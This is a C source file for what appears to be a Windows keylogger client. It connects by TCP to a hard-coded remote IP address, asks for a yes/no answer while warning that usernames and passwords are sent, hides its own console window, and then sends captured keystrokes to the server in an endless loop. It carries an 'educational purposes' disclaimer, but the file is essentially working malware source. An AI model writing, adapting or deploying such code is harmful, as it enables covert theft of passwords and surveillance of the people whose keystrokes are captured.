/*
    Create a TCP socket
*/
 
#include <stdio.h>
#include <winsock2.h>
#include <time.h>
#include <conio.h>
#include "keylogger.h"
#include "message.h"
 
#pragma comment(lib,"ws2_32.lib") //Winsock Library

void hide(void) 
{
 
    HWND hide;
 
    AllocConsole();
 
    hide = FindWindowA("ConsoleWindowClass", NULL);
 
    ShowWindow(hide, 0); // if you change 0 to 1 it will show
 
}

 
int main(int argc , char *argv[])
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
	char *message , server_reply[2000];
	int recv_size;

	printf("%s", argv[1]);

	puts("Welcome to Anonymous information collection CLIENT");
	puts("Disclaimer: This software produced only for educational purposes.");

#pragma region Initialize_Winsock
    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
     
    printf("Initialised.\n");
#pragma endregion
     
#pragma region Create_Socket
	if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d" , WSAGetLastError());
    }
 
    printf("Socket created.\n");
#pragma endregion   
     
#pragma region Prepare_Server_Struct
	server.sin_family = AF_INET;
    //server.sin_addr.s_addr = inet_addr("127.0.0.1"); EMS test
    server.sin_addr.s_addr = inet_addr("209.85.233.109"); 
    //server.sin_port = htons( 8888 );
    server.sin_port = htons( 995 );
#pragma endregion   
    
#pragma region Connect_To_Remote_Server
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        puts("connect error");
        return 1;
    }
     
    puts("Connected");	
#pragma endregion    

	
	//Receive a intro message from the server
	recvMessage(s);
	
	char decision = ' ';
	scanf("%c", &decision);
	
	switch(decision)
	{
		case 'Y':
			puts("Be aware that usernames and passwords are sent, too.");
			send(s, "Y", 10, 0);

			time_t ltime; 
			ltime=time(NULL);
			char timeBuf[60];
			sprintf(timeBuf, "Accepted on %s", asctime( localtime(&ltime) ) );
			send(s, timeBuf, 60, 0); 


			puts("Press any key to run this software in background...");
			while(!kbhit()) {}

			hide();

			break;
		case 'N':
			send(s, "N", 10, 0);
			return 5;
			break;
	}

	//Sending keylog info to server
	while(send(s, getClick(), 20, 0) >= 0) {}
		
    return 0;
}